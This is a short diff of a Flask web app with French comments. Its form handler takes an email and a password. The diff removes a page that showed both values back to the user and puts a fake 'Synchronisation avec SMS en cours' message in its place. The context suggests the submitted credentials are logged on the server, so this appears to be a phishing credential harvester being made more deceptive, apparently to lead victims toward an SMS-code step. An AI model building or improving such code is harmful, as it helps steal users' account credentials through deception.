@@ -28,19 +28,7 @@ def submit():
     print("-----------------------------\n")
 
     # Réponse envoyée au navigateur après l'envoi du form
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html>
-    <head><title>Reçu</title></head>
-    <body>
-        <h2>Données reçues ✔️</h2>
-        <p>Email : {{email}}</p>
-        <p>Password : {{password}}</p>
-        <br>
-        <a href="/">Retour</a>
-    </body>
-    </html>
-    """, email=email, password=password)
+    return "Synchronisation avec SMS en cours"
 
 # Démarrage du serveur (Render, Replit, Railway, etc. utilisent ce port)
 if __name__ == "__main__":
